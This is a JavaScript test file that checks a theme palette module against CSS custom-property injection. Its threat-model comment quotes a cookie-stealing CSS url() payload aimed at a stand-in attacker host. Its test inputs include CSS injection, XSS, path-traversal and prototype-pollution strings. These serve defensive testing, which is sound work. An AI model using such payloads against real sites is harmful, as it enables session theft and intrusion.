/*
  ══════════════════════════════════════════════════════════════════════════════
  SECURITY TEST: CSS Custom Property Injection Prevention
  File: security/themes.test.js
  ══════════════════════════════════════════════════════════════════════════════

  WHY THIS MATTERS (threat model):
  ─────────────────────────────────
  The palette system writes CSS custom properties directly to
  document.documentElement via style.setProperty(). If an attacker could
  supply an arbitrary key or value: for example by tampering with localStorage
  before the page loads: they could inject any CSS expression, including:

    • url("https://attacker.com/?cookie="+document.cookie)
    • expression() in older IE engines
    • Overriding security-sensitive vars like --text on phishing overlays

  The defence: applyPalette() accepts ONLY a key from a hardcoded Set
  (PALETTE_KEYS). Values are looked up from our own PALETTES object: user
  input never touches setProperty() directly.

  WHAT WE VERIFY:
  ───────────────
  1. Valid palette keys write the correct CSS vars to the document root
  2. Invalid / unknown keys clear all managed vars (no partial application)
  3. null, "default", empty string, and injection strings all clear safely
  4. setProperty is NEVER called with a variable name outside MANAGED_VARS
  5. clearPalette() removes exactly the managed vars: nothing more, nothing less
  6. PALETTE_KEYS contains only the intended palette names (no silent additions)
  7. Every key in PALETTE_KEYS has both a "light" and "dark" variant defined
  ══════════════════════════════════════════════════════════════════════════════
*/

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import {
  applyPalette,
  clearPalette,
  PALETTE_KEYS,
  PALETTE_META,
} from "../../lib/themes.js";

describe("Security", () => {

// The exact set of CSS vars the system is allowed to touch.
// If a future change adds a var outside this list, the test catches it.
const MANAGED_VARS = [
  "--bg", "--surface", "--surface-2",
  "--border", "--border-light",
  "--text", "--text-dim", "--text-muted",
  "--accent", "--accent-dim",
];

// ── Helpers ──────────────────────────────────────────────────────────────────

function getRootVar(name) {
  return document.documentElement.style.getPropertyValue(name);
}

// ── Test suites ───────────────────────────────────────────────────────────────

describe("PALETTE_KEYS allowlist", () => {
  it("contains exactly the 6 intended palette names", () => {
    /*
      If someone adds a palette entry to themes.js the count changes.
      This forces a conscious review of any addition to the allowlist.
    */
    expect([...PALETTE_KEYS]).toEqual(
      expect.arrayContaining(["earth", "water", "fire", "forest", "dusk", "stone"])
    );
    expect(PALETTE_KEYS.size).toBe(6);
  });

  it("does not contain wildcard, empty string, or injection strings", () => {
    expect(PALETTE_KEYS.has("*")).toBe(false);
    expect(PALETTE_KEYS.has("")).toBe(false);
    expect(PALETTE_KEYS.has("default")).toBe(false);
    expect(PALETTE_KEYS.has("__proto__")).toBe(false);
    expect(PALETTE_KEYS.has("<script>")).toBe(false);
  });
});

describe("PALETTE_META completeness", () => {
  it("every key in PALETTE_KEYS has a PALETTE_META entry", () => {
    for (const key of PALETTE_KEYS) {
      expect(PALETTE_META[key], `missing PALETTE_META for "${key}"`).toBeDefined();
    }
  });

  it("every PALETTE_META entry has the required swatch display fields", () => {
    for (const [key, meta] of Object.entries(PALETTE_META)) {
      expect(meta.label,      `${key}: missing label`).toBeTruthy();
      expect(meta.lightAccent,`${key}: missing lightAccent`).toMatch(/^#[0-9a-f]{6}$/i);
      expect(meta.darkAccent, `${key}: missing darkAccent`).toMatch(/^#[0-9a-f]{6}$/i);
      expect(meta.lightBg,    `${key}: missing lightBg`).toMatch(/^#[0-9a-f]{6}$/i);
      expect(meta.darkBg,     `${key}: missing darkBg`).toMatch(/^#[0-9a-f]{6}$/i);
    }
  });
});

describe("applyPalette: valid keys", () => {
  afterEach(() => {
    // Always clean up so tests don't bleed into each other
    clearPalette();
  });

  it("writes all managed vars for a valid light palette", () => {
    applyPalette("earth", "light");
    for (const v of MANAGED_VARS) {
      const value = getRootVar(v);
      expect(value, `expected "${v}" to be set after applyPalette("earth","light")`).not.toBe("");
    }
  });

  it("writes all managed vars for a valid dark palette", () => {
    applyPalette("water", "dark");
    for (const v of MANAGED_VARS) {
      const value = getRootVar(v);
      expect(value, `expected "${v}" to be set after applyPalette("water","dark")`).not.toBe("");
    }
  });

  it("only writes vars in the MANAGED_VARS list: no extras", () => {
    /*
      Spy on setProperty to catch any var written outside the allowed list.
      This is the key CSS-injection prevention check.
    */
    const written = new Set();
    const spy = vi.spyOn(document.documentElement.style, "setProperty")
      .mockImplementation((prop, value) => {
        written.add(prop);
      });

    applyPalette("fire", "light");

    for (const prop of written) {
      expect(
        MANAGED_VARS.includes(prop),
        `setProperty was called with unexpected var "${prop}": possible injection vector`
      ).toBe(true);
    }

    spy.mockRestore();
  });

  it("correctly switches vars when the mode changes", () => {
    applyPalette("dusk", "light");
    const lightAccent = getRootVar("--accent");

    clearPalette();
    applyPalette("dusk", "dark");
    const darkAccent = getRootVar("--accent");

    // Light and dark variants of the same palette must use different accent colors
    expect(lightAccent).not.toBe(darkAccent);
  });
});

describe("applyPalette: invalid / injection inputs", () => {
  afterEach(() => clearPalette());

  const INVALID_KEYS = [
    null,
    undefined,
    "default",
    "",
    "EARTH",                        // case sensitive: must not match
    "earth; color: red",            // CSS injection attempt
    "<script>alert(1)</script>",    // XSS attempt
    "../../etc/passwd",             // path traversal
    "__proto__",                    // prototype pollution
    "constructor",
    true,
    42,
  ];

  it.each(INVALID_KEYS)(
    'clears palette and writes no vars for invalid key: %s',
    (badKey) => {
      // Pre-set a var so we can confirm clearPalette ran
      document.documentElement.style.setProperty("--bg", "red");

      applyPalette(badKey, "light");

      expect(getRootVar("--bg")).toBe("");
    }
  );
});

describe("clearPalette", () => {
  it("removes every managed var", () => {
    // Set all vars manually first
    for (const v of MANAGED_VARS) {
      document.documentElement.style.setProperty(v, "hotpink");
    }

    clearPalette();

    for (const v of MANAGED_VARS) {
      expect(getRootVar(v)).toBe("");
    }
  });

  it("does not touch non-managed vars (e.g. --paid, --sent)", () => {
    /*
      clearPalette() should be surgical: only removing the vars it owns.
      Status colors, fonts, and other vars must survive a palette reset.
    */
    document.documentElement.style.setProperty("--paid", "#1a5c3a");
    document.documentElement.style.setProperty("--sent", "#1a3060");

    clearPalette();

    expect(getRootVar("--paid")).toBe("#1a5c3a");
    expect(getRootVar("--sent")).toBe("#1a3060");

    // Cleanup
    document.documentElement.style.removeProperty("--paid");
    document.documentElement.style.removeProperty("--sent");
  });

  it("is idempotent: calling it twice has the same result as once", () => {
    applyPalette("stone", "dark");
    clearPalette();
    clearPalette(); // second call must not throw or re-apply anything

    for (const v of MANAGED_VARS) {
      expect(getRootVar(v)).toBe("");
    }
  });
});

}); // Security
